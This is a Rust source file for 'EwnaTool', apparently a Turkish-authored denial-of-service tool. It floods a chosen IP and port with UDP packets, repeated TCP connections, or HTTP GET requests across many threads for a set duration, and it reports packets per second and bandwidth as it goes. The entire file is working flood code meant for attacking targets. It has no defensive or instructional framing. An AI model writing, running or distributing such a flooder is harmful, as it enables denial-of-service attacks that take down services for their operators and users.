// EwnaTool - Multi-Protocol Flood Engine
// Created By 'Ewnaskia
// Kullanım: flooder <method> <ip> <port> <threads> <duration>

use std::env;
use std::net::{IpAddr, SocketAddr, TcpStream, UdpSocket};
use std::str::FromStr;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};
use rand::Rng;

static PACKETS: AtomicU64 = AtomicU64::new(0);
static BYTES: AtomicU64 = AtomicU64::new(0);
static RUNNING: AtomicBool = AtomicBool::new(true);

fn udp_flood(ip: IpAddr, port: u16, size: usize) {
    let target = SocketAddr::new(ip, port);
    let socket = match UdpSocket::bind("0.0.0.0:0") {
        Ok(s) => s,
        Err(_) => return,
    };
    let _ = socket.set_write_timeout(Some(Duration::from_millis(1)));
    
    let mut rng = rand::thread_rng();
    let mut payload = vec![0u8; size];
    rng.fill(&mut payload[..]);
    
    while RUNNING.load(Ordering::Relaxed) {
        if let Ok(n) = socket.send_to(&payload, target) {
            PACKETS.fetch_add(1, Ordering::Relaxed);
            BYTES.fetch_add(n as u64, Ordering::Relaxed);
        }
    }
}

fn tcp_flood(ip: IpAddr, port: u16) {
    let target = SocketAddr::new(ip, port);
    while RUNNING.load(Ordering::Relaxed) {
        let _ = TcpStream::connect_timeout(&target, Duration::from_millis(100));
        PACKETS.fetch_add(1, Ordering::Relaxed);
    }
}

fn http_flood(ip: IpAddr, port: u16) {
    use std::io::Write;
    let target = SocketAddr::new(ip, port);
    let paths = ["/", "/index.php", "/login", "/api", "/search", "/admin"];
    let mut rng = rand::thread_rng();
    
    while RUNNING.load(Ordering::Relaxed) {
        if let Ok(mut stream) = TcpStream::connect_timeout(&target, Duration::from_millis(500)) {
            let path = paths[rng.gen_range(0..paths.len())];
            let req = format!(
                "GET {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n",
                path, ip
            );
            let _ = stream.write_all(req.as_bytes());
            PACKETS.fetch_add(1, Ordering::Relaxed);
            BYTES.fetch_add(req.len() as u64, Ordering::Relaxed);
        }
    }
}

fn stats(start: Instant) {
    let mut last_packets = 0u64;
    let mut last_bytes = 0u64;
    while RUNNING.load(Ordering::Relaxed) {
        thread::sleep(Duration::from_secs(1));
        let p = PACKETS.load(Ordering::Relaxed);
        let b = BYTES.load(Ordering::Relaxed);
        let elapsed = start.elapsed().as_secs_f64();
        let pps = p - last_packets;
        let mbps = ((b - last_bytes) as f64 * 8.0) / 1_000_000.0;
        last_packets = p;
        last_bytes = b;
        println!("[{:.1}s] PPS: {} | Mbps: {:.2} | Toplam: {} paket", elapsed, pps, mbps, p);
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 6 {
        eprintln!("Kullanım: flooder <udp|tcp|http> <ip> <port> <threads> <duration>");
        std::process::exit(1);
    }
    
    let method = args[1].clone();
    let ip = IpAddr::from_str(&args[2]).expect("Geçersiz IP");
    let port: u16 = args[3].parse().expect("Geçersiz port");
    let threads: usize = args[4].parse().unwrap_or(100);
    let duration: u64 = args[5].parse().unwrap_or(60);
    
    println!("[i] Metod: {}", method);
    println!("[i] Hedef: {}:{}", ip, port);
    println!("[i] Thread: {}", threads);
    println!("[i] Süre: {}s", duration);
    println!();
    
    let start = Instant::now();
    
    // İstatistik thread
    let stats_handle = thread::spawn(move || stats(start));
    
    let mut handles = vec![];
    for _ in 0..threads {
        let m = method.clone();
        let handle = thread::spawn(move || {
            match m.as_str() {
                "udp" => udp_flood(ip, port, 65507),
                "tcp" => tcp_flood(ip, port),
                "http" => http_flood(ip, port),
                _ => udp_flood(ip, port, 1024),
            }
        });
        handles.push(handle);
    }
    
    thread::sleep(Duration::from_secs(duration));
    RUNNING.store(false, Ordering::Relaxed);
    
    for h in handles { let _ = h.join(); }
    let _ = stats_handle.join();
    
    println!();
    println!("[✓] Toplam paket: {}", PACKETS.load(Ordering::Relaxed));
    println!("[✓] Toplam veri: {:.2} MB", BYTES.load(Ordering::Relaxed) as f64 / 1_048_576.0);
}